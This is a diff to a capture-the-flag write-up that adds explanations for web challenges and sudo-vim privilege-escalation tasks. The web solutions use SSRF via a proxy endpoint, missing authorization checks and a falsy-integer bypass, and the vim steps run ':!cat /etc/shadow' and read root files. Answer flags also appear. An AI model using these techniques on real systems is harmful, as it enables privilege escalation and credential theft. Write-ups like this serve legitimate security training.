@@ -378,6 +378,8 @@ curl "https://game.sigflag.at:3087/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/h
 
 ### A1
 
+get the info of user `flag1`: `http://game.sigflag.at:3002/userinfo/flag1`
+
 ```python
 users = DefaultDict(
     {
@@ -408,9 +410,6 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/flag1
-```
 
 ### A2
 
@@ -445,6 +444,8 @@ async def login(username=Form(), password=Form(), authorize: AuthJWT = Depends()
 
 ### A4
 
+since every call of the `/proxy` endpoint takes at least 1 second, we can chain 5 together to get to the 5 second threshold: `http://game.sigflag.at:3002/proxy/proxy/proxy/proxy/proxy/proxy`
+
 ```python
 @app.middleware("http")
 async def timeout_middleware(request: Request, call_next):
@@ -465,11 +466,9 @@ def localproxy(path: str):
     return PlainTextResponse(requests.get("http://localhost/" + path).text)
 ```
 
-```
-http://game.sigflag.at:3002/proxy/proxy/proxy/proxy/proxy/proxy
-```
-
 ### A5
+
+since we only need some JWT cookie (the content is never checked), we can log in as any user and get the admin password: `http://game.sigflag.at:3002/userinfo/admin`
 
 ```python
 users = DefaultDict(
@@ -501,15 +500,14 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/admin
-```
-
 ### A6
 
 ### A7
 
 ### A8
+
+because the userinfo endpoint takes integers, we can use the username `0` to get flag 8 since the integer `0` is falsy: `http://game.sigflag.at:3002/userinfo/0`
+    
 
 ```python
 @data.get("/userinfo/{username}")
@@ -530,11 +528,11 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/userinfo/0
-```
-
 ### A9
+
+flag 9 is only shown if an exception is triggered and the request comes from localhost
+
+if we call the `/crypto` endpoint with no parameters, we can trigger the exception - and the request comes from localhost if we send it through the `/proxy` endpoint: `http://game.sigflag.at:3002/proxy/crypto`
 
 ```python
 @data.get("/crypto")
@@ -575,11 +573,11 @@ def general_exception_handler(req: Request, exc: Exception):
         return PlainTextResponse(str(exc), 500)
 ```
 
-```
-http://game.sigflag.at:3002/proxy/crypto
-```
-
 ### A10
+
+we can only access the user info of the `local` user if the request comes from localhost
+
+the `/proxy` endpoint allows us to send requests to localhost: `http://game.sigflag.at:3002/proxy/userinfo/local`
 
 ```python
 users = DefaultDict(
@@ -619,39 +617,52 @@ async def userinfo(username: int | str, request: Request, authorize: AuthJWT = D
     return {"name": username, "pass": password}
 ```
 
-```
-http://game.sigflag.at:3002/proxy/userinfo/local
-```
-
 ## Misc
 
 ### Sudo Vim 1
 
-```
+because we can execute vim via sudo, we can use it to execute commands as root via `:!`
+
+the first flag is in root's home
+
+```bash
+# in vim
 :!cat /root/flag
 ```
 
 ### Sudo Vim 2
 
+the second flag is in the environment
+
+this command can be executed without root privileges
+
 ```bash
-printenv # not in vim
+printenv
 ```
 
 ### Sudo Vim 3
 
-```
-:!cat /etc/passwd
+the next flag is in the passwd file, accessible to everyone
+
+```bash
+cat /etc/passwd
 ```
 
 ### Sudo Vim 4
 
-```
+the next flag is in the shadow file, only accessible to root
+
+```bash
+# in vim
 :!cat /etc/shadow
 ```
 
 ### Sudo Vim 5
 
-```
+the next flag is also in the shadow file, but base64 encoded
+
+```bash
+# in vim
 :!cat /etc/shadow
 ```
 
@@ -659,13 +670,19 @@ decode `U0lHe00wNS1TbGlnaHRseUIzdHRlckhpZGRlblBhc3N3b3JkfQ==` (base64)
 
 ### Sudo Vim 6
 
-```
+the 6th flag is in the root home directory, hidden from `ls` since it's prefixed with `.`
+
+```bash
+#in vim
 :!cat /root/.flag
 ```
 
 ### Sudo Vim 7
 
-```
+the next flag is also there, but base85 encoded
+
+```bash
+# in vim
 :!cat /root/.encryptedflag85
 ```
 
@@ -673,8 +690,10 @@ decode ``;b9K+9e\LX6=FqH2De!H=(-ARDf8'QF*U5nE\`?^dF+"`` (base85)
 
 ### Sudo Vim 8
 
+the last flag is revealed by executing `man`:
+
 ```bash
-man # not in vim
+man
 ```
 
 ## Stego
